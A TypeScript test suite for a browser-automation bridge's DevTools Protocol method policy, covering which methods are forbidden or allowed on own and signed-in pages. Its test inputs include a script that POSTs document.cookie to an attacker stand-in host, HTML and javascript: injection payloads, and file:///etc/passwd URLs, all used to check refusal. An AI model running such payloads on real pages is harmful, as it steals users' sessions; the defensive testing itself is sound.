import { createHash } from "node:crypto";
import { PAGES_SCRIPT_METHODS, type PagesScriptSetV1 } from "@vibefield/contracts";
import { describe, expect, it } from "vitest";
import {
  ACTS_ON_PAGE,
  BODY_METHODS,
  classify,
  EXPECTED_REFUSED,
  NEVER_METHODS,
  OWN_ALLOWED,
  pageClassOf,
  SCRIPT_FIELDS,
  SIGNED_IN_NEVER,
  urlVerdict,
} from "../src/main/pages/core/policy";
import { createScriptMatcher } from "../src/main/pages/core/script-match";
import {
  type BridgeGrants,
  type BridgePage,
  type MethodDecision,
  NO_GRANTS,
  PAGE_CLASSES,
  type PolicyContext,
  type ScriptMatcher,
  type SessionKind,
} from "../src/main/pages/core/types";

// EY-1 (2026-11-19): methods, not domains, per page class (SITTINGS §4, browser-use §4.2–§4.3).

const OWN: BridgePage = {
  pageId: "pg-00000001",
  pageClass: "own",
  runKey: "run-a",
  site: null,
  runFolder: null,
};
const SIGNED: BridgePage = {
  pageId: "pg-00000002",
  pageClass: "signed-in",
  runKey: "run-a",
  site: "vfey-a.test",
  runFolder: null,
};
const ALL_GRANTS: BridgeGrants = { script: true, bodies: true };

const sha = (text: string): string =>
  createHash("sha256").update(Buffer.from(text, "utf8")).digest("hex");
const exact = (
  id: string,
  text: string,
  method: "Runtime.evaluate" | "Runtime.callFunctionOn" | "Runtime.addBinding",
  commandClass: "read" | "act",
) => ({
  id,
  sha256: sha(text),
  length: Buffer.byteLength(text, "utf8"),
  method,
  commandClass,
  commands: ["connect"],
});
/** A small recorded set: the connect probe, a field's clear (an act) and a binding's name. */
const SET: PagesScriptSetV1 = {
  v: 1,
  engineVersion: "0.41.0",
  recordedCalls: 3,
  unmatchedCallSites: [],
  exact: [
    exact("x001", "1", "Runtime.evaluate", "read"),
    exact("x002", "function(){ this.value = ''; }", "Runtime.callFunctionOn", "act"),
    exact("x003", "__vf_engine_binding", "Runtime.addBinding", "read"),
  ],
  templates: [
    {
      id: "find",
      method: "Runtime.evaluate",
      commandClass: "read",
      callSite: "element.rs:964",
      parts: [
        { kind: "fixed", sha256: sha("document.querySelector("), length: 23 },
        { kind: "json-string" },
        { kind: "fixed", sha256: sha(")"), length: 1 },
      ],
    },
  ],
};
/** the test's own hosts are two labels deep, so their registrable domain is their last two */
const siteOf = (host: string): string | null => host.split(".").slice(-2).join(".");
const nothing: ScriptMatcher = () => ({ matched: false });
const WITH_SET: PolicyContext = { matchScript: createScriptMatcher(SET), siteOf };

function cls(
  method: string,
  params: Record<string, unknown> = {},
  over: {
    page?: BridgePage;
    session?: SessionKind;
    grants?: BridgeGrants;
    ctx?: PolicyContext;
  } = {},
): MethodDecision {
  return classify(
    {
      call: { method, params },
      page: over.page ?? OWN,
      session: over.session ?? "page",
      grants: over.grants ?? NO_GRANTS,
    },
    over.ctx ?? { matchScript: nothing, siteOf },
  );
}
const signed = (
  method: string,
  params: Record<string, unknown> = {},
  over: Parameters<typeof cls>[2] = {},
) => cls(method, params, { page: SIGNED, ...over });
const code = (d: MethodDecision): string => (d.verdict.ok ? "ok" : d.verdict.code);

describe("the bridge's method policy (EY-1)", () => {
  it("holds frozen read-only sets", () => {
    expect(() => (NEVER_METHODS as Set<string>).add("Page.navigate")).toThrow(TypeError);
    expect(() => (OWN_ALLOWED as Set<string>).delete("Page.navigate")).toThrow(TypeError);
    expect(NEVER_METHODS.has("Network.getAllCookies")).toBe(true);
    expect(PAGE_CLASSES).toEqual(["own", "signed-in"]);
    // the table as sitting 2 measured it, whole
    expect(OWN_ALLOWED.size).toBe(178);
  });

  it("never forwards the never-list, on both classes and any forwarding session", () => {
    const never = [
      "Target.getTargets",
      "Target.attachToTarget",
      "Browser.close",
      "Network.getAllCookies",
      "Network.clearBrowserCookies",
      "Network.clearBrowserCache",
      "Network.setCookie",
      "Network.setCookies",
      "Network.deleteCookies",
      "Storage.getCookies",
      "Storage.setCookies",
      "Storage.clearCookies",
      "Storage.clearDataForOrigin",
      "Storage.clearDataForStorageKey",
      "Page.setDownloadBehavior",
      "Page.startScreencast",
      "Page.stopScreencast",
      "Page.crash",
      "Inspector.crash",
    ];
    for (const method of never) {
      for (const page of [OWN, SIGNED]) {
        for (const session of ["page", "child"] as const) {
          const d = cls(
            method,
            { downloadPath: "/private/tmp", behavior: "allow" },
            { page, session, grants: ALL_GRANTS },
          );
          expect(code(d), `${method} ${page.pageClass} ${session}`).toBe("forbidden");
          expect(d.expected).toBe(false);
        }
      }
    }
  });

  it("refuses WebMCP.enable as expected, counted apart", () => {
    const d = cls("WebMCP.enable");
    expect(code(d)).toBe("forbidden");
    expect(d.expected).toBe(true);
    expect(EXPECTED_REFUSED.has("WebMCP.enable")).toBe(true);
    // Path 2 answers Browser.setDownloadBehavior at the root: reaching the policy is unexpected
    const download = cls("Browser.setDownloadBehavior", { behavior: "allow" });
    expect(code(download)).toBe("forbidden");
    expect(download.expected).toBe(false);
  });

  it("forwards nothing from the root and tab sessions", () => {
    for (const session of ["root", "tab"] as const) {
      expect(code(cls("Runtime.enable", {}, { session }))).toBe("forbidden");
    }
    expect(code(cls("Runtime.enable", {}, { session: "child" }))).toBe("ok");
  });

  it("refuses an unlisted method of an allowed domain: methods, not domains", () => {
    expect(code(cls("Page.enable"))).toBe("ok");
    for (const method of [
      "Page.setBypassCSP",
      "Network.setCacheDisabled",
      "Input.setIgnoreInputEvents",
      "Debugger.pause",
      "Debugger.setPauseOnExceptions",
      "HeapProfiler.takeHeapSnapshot",
      "SystemInfo.getInfo",
      "Page.close",
      "Runtime.queryObjects",
    ]) {
      expect(code(cls(method)), method).toBe("forbidden");
    }
    expect(code(cls("not a method"))).toBe("forbidden");
  });

  it("refuses Emulation on both classes; throttling passes on own as an act, never on signed-in", () => {
    for (const page of [OWN, SIGNED]) {
      expect(code(cls("Emulation.setDeviceMetricsOverride", {}, { page }))).toBe("forbidden");
      expect(code(cls("Emulation.setGeolocationOverride", {}, { page }))).toBe("forbidden");
    }
    const own = cls("Network.emulateNetworkConditions", { offline: true });
    expect(code(own)).toBe("ok");
    expect(own.mutation).toBe(true);
    expect(own.journal).toBe("throttling");
    expect(code(signed("Network.emulateNetworkConditions", { offline: true }))).toBe("forbidden");
  });

  it("never passes a signed-in page's cookies, DOMStorage, IndexedDB or CacheStorage", () => {
    for (const method of [
      "Network.getCookies",
      "DOMStorage.getDOMStorageItems",
      "IndexedDB.requestData",
      "CacheStorage.requestEntries",
    ]) {
      expect(code(cls(method)), `own: ${method}`).toBe("ok");
      expect(code(signed(method, {}, { grants: ALL_GRANTS })), method).toBe("forbidden");
    }
  });

  it("passes bodies on a signed-in page only with its bodies grant", () => {
    for (const method of BODY_METHODS) {
      expect(code(cls(method, { requestId: "1" })), `own: ${method}`).toBe("ok");
      expect(code(signed(method, { requestId: "1" })), method).toBe("forbidden");
      expect(
        code(signed(method, { requestId: "1" }, { grants: { script: false, bodies: true } })),
      ).toBe("ok");
    }
  });

  it("passes routes, headers and debugging on a signed-in page only with its script grant", () => {
    for (const method of [
      "Fetch.enable",
      "Network.setExtraHTTPHeaders",
      "Debugger.enable",
      "Profiler.start",
      "Tracing.start",
    ]) {
      expect(code(cls(method)), `own: ${method}`).toBe("ok");
      expect(code(signed(method)), method).toBe("forbidden");
      expect(code(signed(method, {}, { grants: { script: true, bodies: false } })), method).toBe(
        "ok",
      );
    }
    expect(cls("Fetch.enable").journal).toBe("route");
    expect(cls("Network.setExtraHTTPHeaders", { headers: {} }).journal).toBe("extra-headers");
  });

  it("loads only http, https and about:blank", () => {
    for (const url of [
      "file:///etc/hosts",
      "javascript:alert(1)",
      "data:text/html,x",
      "chrome://version",
      "blob:http://vfey-b.test/x",
      "view-source:http://vfey-b.test/",
      "about:srcdoc",
      "not a url",
    ]) {
      expect(code(cls("Page.navigate", { url })), url).toBe("forbidden");
      expect(code(cls("Network.loadNetworkResource", { url, frameId: "f" })), url).toBe(
        "forbidden",
      );
    }
    expect(code(cls("Page.navigate", { url: "http://vfey-b.test/a" }))).toBe("ok");
    expect(code(cls("Page.navigate", { url: "about:blank" }))).toBe("ok");
    expect(code(cls("Fetch.continueRequest", { requestId: "1" }))).toBe("ok");
    expect(code(cls("Fetch.continueRequest", { requestId: "1", url: "file:///etc/passwd" }))).toBe(
      "forbidden",
    );
    // the endpoint's own check for Target.createTarget
    const target = urlVerdict("file:///x", OWN, { siteBound: false });
    expect(target.ok ? "ok" : target.code).toBe("forbidden");
  });

  it("holds a signed-in page to its site by the injected siteOf, and refuses with none", () => {
    expect(code(signed("Page.navigate", { url: "http://vfey-b.test/" }))).toBe("off-site");
    expect(code(signed("Page.navigate", { url: "http://vfey-a-login.test/" }))).toBe("off-site");
    expect(code(signed("Page.navigate", { url: "http://vfey-a.test:8080/next" }))).toBe("ok");
    expect(code(signed("Page.navigate", { url: "http://www.vfey-a.test/" }))).toBe("ok");
    expect(code(signed("Page.navigateToHistoryEntry", { entryId: 1 }))).toBe("forbidden");
    expect(
      code(cls("Page.navigate", { url: "http://vfey-a.test/" })),
      "own pages are not site-bound",
    ).toBe("ok");
    // fail closed: no site rule, or none for this host
    const url = { url: "http://vfey-a.test/" };
    expect(code(signed("Page.navigate", url, { ctx: { matchScript: nothing } }))).toBe("off-site");
    expect(
      code(signed("Page.navigate", url, { ctx: { matchScript: nothing, siteOf: () => null } })),
    ).toBe("off-site");
  });

  it("refuses DOM.setFileInputFiles on both classes while no path rule exists", () => {
    const files = { files: ["/private/tmp/vfey-abc/run/f.txt"], backendNodeId: 1 };
    expect(code(cls("DOM.setFileInputFiles", files))).toBe("outside-folder");
    expect(code(signed("DOM.setFileInputFiles", files, { grants: ALL_GRANTS }))).toBe("forbidden");
    // a named folder changes nothing until uploads bring their rule
    const named = cls("DOM.setFileInputFiles", files, {
      page: { ...OWN, runFolder: "/private/tmp/vfey-abc/run" },
    });
    expect(code(named)).toBe("outside-folder");
  });

  it("says a still is a capture, not a mutation, on the own page", () => {
    for (const method of ["Page.captureScreenshot", "Page.printToPDF"]) {
      const d = cls(method);
      expect(code(d)).toBe("ok");
      expect(d.capture).toBe(true);
      expect(d.mutation).toBe(false);
    }
  });

  it("flags mutations for the windows", () => {
    for (const [method, params] of [
      ["Input.dispatchMouseEvent", {}],
      ["Page.navigate", { url: "http://vfey-b.test/" }],
      ["DOM.setAttributeValue", { nodeId: 1, name: "title", value: "x" }],
      ["Page.reload", {}],
      ["DOM.focus", {}],
    ] as const) {
      expect(cls(method, params).mutation, method).toBe(true);
    }
    for (const method of [
      "DOM.getDocument",
      "Accessibility.getFullAXTree",
      "Runtime.getProperties",
    ]) {
      expect(cls(method).mutation, method).toBe(false);
    }
  });

  it("passes the engine's exact bodies on a signed-in page with their recorded class", () => {
    const probe = signed("Runtime.evaluate", { expression: "1" }, { ctx: WITH_SET });
    expect(code(probe)).toBe("ok");
    expect(probe.script).toEqual({ source: "engine", commandClass: "read", entryId: "x001" });
    expect(probe.mutation).toBe(false);
    const clear = signed(
      "Runtime.callFunctionOn",
      { functionDeclaration: "function(){ this.value = ''; }" },
      { ctx: WITH_SET },
    );
    expect(code(clear)).toBe("ok");
    expect(clear.script).toEqual({ source: "engine", commandClass: "act", entryId: "x002" });
    expect(clear.mutation, "an act body is a mutation: refused in a read window").toBe(true);
  });

  it("allows script outside the set on the own page as the agent's, and refuses it signed-in without the grant", () => {
    const body = {
      expression: "fetch('https://evil.example', {method:'POST', body: document.cookie})",
    };
    const own = cls("Runtime.evaluate", body, { ctx: WITH_SET });
    expect(code(own)).toBe("ok");
    expect(own.script).toEqual({ source: "agent" });
    expect(own.mutation).toBe(true);
    expect(code(signed("Runtime.evaluate", body, { ctx: WITH_SET }))).toBe("forbidden");
    expect(
      code(
        signed("Runtime.evaluate", body, {
          ctx: WITH_SET,
          grants: { script: true, bodies: false },
        }),
      ),
    ).toBe("ok");
    expect(code(signed("Runtime.evaluate", { expression: "1" })), "no set: nothing matches").toBe(
      "forbidden",
    );
    expect(code(signed("Runtime.evaluate", {})), "a script method without its body").toBe(
      "forbidden",
    );
  });

  it("judges every script-carrying method by its source on a signed-in page", () => {
    const cases = [
      ["Page.addScriptToEvaluateOnNewDocument", { source: "window.x=1" }],
      ["Page.createIsolatedWorld", { frameId: "f", worldName: "agent-world" }],
      ["Runtime.compileScript", { expression: "x", sourceURL: "", persistScript: true }],
      ["Runtime.runScript", { scriptId: "1" }],
      ["Debugger.evaluateOnCallFrame", { callFrameId: "c", expression: "x" }],
      ["Debugger.setScriptSource", { scriptId: "1", scriptSource: "x" }],
      ["Debugger.setBreakpointByUrl", { lineNumber: 1, url: "x", condition: "fetch('x')" }],
      ["Page.reload", { scriptToEvaluateOnLoad: "x" }],
    ] as const;
    for (const [method, params] of cases) {
      expect(
        code(signed(method, params, { ctx: WITH_SET, grants: { script: true, bodies: false } })),
        `with grant: ${method}`,
      ).toBe("ok");
      const no = signed(method, params, { ctx: WITH_SET });
      expect(code(no), method).toBe("forbidden");
      expect(no.script, method).toEqual({ source: "agent" });
      expect(code(cls(method, params, { ctx: WITH_SET })), `own: ${method}`).toBe("ok");
    }
    const plain = signed(
      "Debugger.setBreakpointByUrl",
      { lineNumber: 1, url: "x" },
      { grants: { script: true, bodies: false } },
    );
    expect(plain.script, "a breakpoint without a condition is not script").toBeNull();
  });

  it("passes Runtime.addBinding only by a recorded name, on both classes", () => {
    for (const page of [OWN, SIGNED]) {
      const yes = cls(
        "Runtime.addBinding",
        { name: "__vf_engine_binding" },
        { page, ctx: WITH_SET },
      );
      expect(code(yes), page.pageClass).toBe("ok");
      expect(yes.journal).toBe("binding");
      const no = cls(
        "Runtime.addBinding",
        { name: "agentBinding" },
        { page, ctx: WITH_SET, grants: ALL_GRANTS },
      );
      expect(code(no), page.pageClass).toBe("forbidden");
    }
    expect(
      cls("Runtime.evaluate", { expression: "__vf_engine_binding" }, { ctx: WITH_SET }).script,
      "a name recorded for addBinding is not an evaluate body",
    ).toEqual({ source: "agent" });
  });

  it("takes script by markup on a signed-in page as the agent's", () => {
    for (const [method, params] of [
      ["DOM.setOuterHTML", { nodeId: 1, outerHTML: "<img src=x onerror=alert(1)>" }],
      ["DOM.setAttributeValue", { nodeId: 1, name: "onclick", value: "x()" }],
      ["DOM.setAttributeValue", { nodeId: 1, name: "href", value: " java\tscript:x()" }],
      ["DOM.setAttributeValue", { nodeId: 1, name: "srcdoc", value: "<script>x()</script>" }],
      ["Page.setDocumentContent", { frameId: "f", html: "<script>x()</script>" }],
    ] as const) {
      expect(code(signed(method, params)), method).toBe("forbidden");
      expect(code(cls(method, params)), `own: ${method}`).toBe("ok");
    }
    expect(
      code(signed("DOM.setAttributeValue", { nodeId: 1, name: "value", value: "hello" })),
    ).toBe("ok");
  });

  it("never forwards Input.dispatchDragEvent: a drop could carry any local file", () => {
    const drop = {
      type: "drop",
      x: 1,
      y: 1,
      data: { items: [], files: ["/etc/hosts"], dragOperationsMask: 1 },
    };
    expect(OWN_ALLOWED.has("Input.dispatchDragEvent")).toBe(false);
    expect(code(cls("Input.dispatchDragEvent", drop))).toBe("forbidden");
    expect(
      code(cls("Input.dispatchDragEvent", { type: "dragEnter", x: 1, y: 1, data: { items: [] } })),
    ).toBe("forbidden");
    expect(code(signed("Input.dispatchDragEvent", drop, { grants: ALL_GRANTS }))).toBe("forbidden");
    // the pin drags by Input.dispatchMouseEvent, unchanged
    expect(code(cls("Input.dispatchMouseEvent", { type: "mouseMoved", x: 1, y: 1 }))).toBe("ok");
  });

  it("passes Page.getNavigationHistory on the own page, never on a signed-in one", () => {
    expect(code(cls("Page.getNavigationHistory"))).toBe("ok");
    expect(code(signed("Page.getNavigationHistory"))).toBe("forbidden");
    expect(code(signed("Page.getNavigationHistory", {}, { grants: ALL_GRANTS }))).toBe("forbidden");
  });

  it("never passes a picture of a signed-in page, whatever its grants", () => {
    const pictures = ["Page.captureScreenshot", "Page.printToPDF", "Page.captureSnapshot"];
    expect([...SIGNED_IN_NEVER]).toEqual(
      expect.arrayContaining([...pictures, "Page.startScreencast"]),
    );
    for (const method of pictures) {
      expect(signed(method, {}, { grants: ALL_GRANTS }).verdict, method).toMatchObject({
        ok: false,
        code: "forbidden",
        reason: expect.stringMatching(/sign-ins/),
      });
    }
    // the screencast is on the never-list too, which answers first, on both classes
    expect(code(signed("Page.startScreencast", {}, { grants: ALL_GRANTS }))).toBe("forbidden");
    // the own page keeps its one still per read window; MHTML stays off its allowlist
    expect(code(cls("Page.captureScreenshot", { format: "png" }))).toBe("ok");
    expect(code(cls("Page.printToPDF"))).toBe("ok");
    expect(code(cls("Page.captureSnapshot"))).toBe("forbidden");
  });

  it("refuses Page.captureScreenshot from the window's pixels, on both classes", () => {
    expect(code(cls("Page.captureScreenshot", { format: "png" }))).toBe("ok");
    expect(code(cls("Page.captureScreenshot", { format: "png", fromSurface: true }))).toBe("ok");
    const own = cls("Page.captureScreenshot", { format: "png", fromSurface: false });
    expect(code(own)).toBe("forbidden");
    expect(own.capture).toBe(true);
    expect(code(signed("Page.captureScreenshot", { fromSurface: false }))).toBe("forbidden");
  });

  it("takes a PDF as its bytes in the answer, never as a stream to read later (2026-11-24)", () => {
    // the engine's own shape, and the default said out loud
    const engine = { printBackground: true, landscape: false, preferCSSPageSize: true };
    expect(code(cls("Page.printToPDF"))).toBe("ok");
    expect(code(cls("Page.printToPDF", engine))).toBe("ok");
    expect(code(cls("Page.printToPDF", { ...engine, transferMode: "ReturnAsBase64" }))).toBe("ok");
    const stream = cls("Page.printToPDF", { ...engine, transferMode: "ReturnAsStream" });
    expect(code(stream)).toBe("forbidden");
    expect(stream.capture).toBe(true);
    for (const transferMode of ["returnasstream", "", 1, null]) {
      expect(code(cls("Page.printToPDF", { transferMode })), String(transferMode)).toBe(
        "forbidden",
      );
    }
    // a trace's stream is no picture: its handle is still read
    expect(code(cls("Tracing.start", { traceConfig: {}, transferMode: "ReturnAsStream" }))).toBe(
      "ok",
    );
    expect(code(cls("IO.read", { handle: "1" }))).toBe("ok");
    expect(code(cls("IO.close", { handle: "1" }))).toBe("ok");
  });

  it("closes the trusted client's tracing doors, and passes the engine's two shapes", () => {
    const trace = {
      traceConfig: { recordMode: "recordContinuously" },
      transferMode: "ReturnAsStream",
    };
    const profiler = {
      traceConfig: { includedCategories: ["devtools.timeline", "toplevel"], enableSampling: true },
      transferMode: "ReportEvents",
    };
    expect(code(cls("Tracing.start", trace))).toBe("ok");
    expect(code(cls("Tracing.start", profiler))).toBe("ok");
    expect(cls("Tracing.start", trace).journal).toBe("tracing");
    for (const params of [
      { perfettoConfig: "AAAA" },
      { tracingBackend: "system" },
      { categories: "*" },
      { options: "record-continuously" },
      {
        traceConfig: {
          includedCategories: ["devtools.timeline", "disabled-by-default-devtools.screenshot"],
        },
      },
      { traceConfig: "not an object" },
    ]) {
      expect(code(cls("Tracing.start", params)), JSON.stringify(params)).toBe("forbidden");
    }
    expect(code(cls("Tracing.start", { tracingBackend: "chrome" }))).toBe("ok");
    expect(code(signed("Tracing.start", trace))).toBe("forbidden");
    const grant = { grants: { script: true, bodies: false } };
    expect(code(signed("Tracing.start", trace, grant))).toBe("ok");
    expect(code(signed("Tracing.start", { perfettoConfig: "AAAA" }, grant))).toBe("forbidden");
  });

  it("takes a breakpoint as a mutation, with or without a condition", () => {
    for (const method of [
      "Debugger.setBreakpoint",
      "Debugger.setBreakpointByUrl",
      "Debugger.setBreakpointOnFunctionCall",
    ]) {
      const d = cls(method, { lineNumber: 1, url: "http://vfey-b.test/a.js" });
      expect(code(d), method).toBe("ok");
      expect(d.mutation, method).toBe(true);
      expect(d.script, `${method}: no condition, no script`).toBeNull();
      expect(d.journal, method).toBe("breakpoint");
    }
    expect(cls("Debugger.enable").journal).toBe("debugger");
  });

  it("passes the Fetch answers that serve or let a request go on a signed-in page only with its script grant", () => {
    for (const method of [
      "Fetch.continueRequest",
      "Fetch.fulfillRequest",
      "Fetch.continueWithAuth",
    ]) {
      expect(code(cls(method, { requestId: "r1" })), `own: ${method}`).toBe("ok");
      expect(code(signed(method, { requestId: "r1" })), method).toBe("forbidden");
      expect(
        code(signed(method, { requestId: "r1" }, { grants: { script: true, bodies: false } })),
      ).toBe("ok");
    }
  });

  it("passes Fetch.failRequest on a signed-in page whatever its grants: failing a paused request frees the page", () => {
    const granted = { grants: { script: true, bodies: false } };
    // the route is set under the script grant, and a request pauses on it
    expect(code(signed("Fetch.enable", { patterns: [{ urlPattern: "*" }] }, granted))).toBe("ok");
    // the grant is withdrawn while it is paused: the answers that serve the page are refused...
    for (const method of [
      "Fetch.continueRequest",
      "Fetch.fulfillRequest",
      "Fetch.continueWithAuth",
    ]) {
      expect(code(signed(method, { requestId: "r1" })), method).toBe("forbidden");
    }
    // ...and failing it still passes, so the request ends and the page's load is never left hanging
    const failed = signed("Fetch.failRequest", { requestId: "r1", errorReason: "Aborted" });
    expect(code(failed)).toBe("ok");
    expect(failed.mutation).toBe(false);
    expect(failed.journal).toBe(null);
    const failing = { requestId: "r2", errorReason: "Failed" };
    expect(code(signed("Fetch.failRequest", failing, granted))).toBe("ok");
    expect(code(cls("Fetch.failRequest", failing))).toBe("ok");
  });
});

describe("what acts on the page, under a second session per client (EY-1)", () => {
  it("stays refused on every session: Emulation.*, Debugger.pause, Debugger.setPauseOnExceptions, and the input locks", () => {
    expect([...ACTS_ON_PAGE].sort()).toEqual([
      "Debugger.pause",
      "Debugger.setPauseOnExceptions",
      "Emulation.*",
    ]);
    for (const method of [
      "Emulation.setDeviceMetricsOverride",
      "Debugger.pause",
      "Debugger.setPauseOnExceptions",
    ]) {
      for (const page of [OWN, SIGNED]) {
        for (const session of ["page", "child"] as const) {
          expect(
            cls(method, {}, { page, session, grants: ALL_GRANTS }).verdict,
            `${method} ${session}`,
          ).toMatchObject({
            ok: false,
            code: "forbidden",
            reason: expect.stringMatching(/acts on the page/),
          });
        }
      }
    }
    for (const method of ["Input.setIgnoreInputEvents", "Input.dispatchDragEvent"]) {
      expect(OWN_ALLOWED.has(method), method).toBe(false);
      expect(code(cls(method, {}, { grants: ALL_GRANTS })), method).toBe("forbidden");
    }
  });

  it("forwards a client's disables plainly, with no count between them", () => {
    for (const method of [
      "Page.disable",
      "Runtime.disable",
      "Network.disable",
      "Fetch.disable",
      "DOM.disable",
    ]) {
      expect(code(cls(method)), method).toBe("ok");
      expect(code(cls(method)), `${method}, twice`).toBe("ok");
    }
  });

  it("names in SCRIPT_FIELDS exactly the methods the record carries script by", () => {
    expect(Object.keys(SCRIPT_FIELDS).sort()).toEqual([...PAGES_SCRIPT_METHODS].sort());
  });

  it("reads a page's class off its profile: persistent is signed-in, memory is own", () => {
    expect(pageClassOf({ mode: "persistent" })).toBe("signed-in");
    expect(pageClassOf({ mode: "memory" })).toBe("own");
  });
});
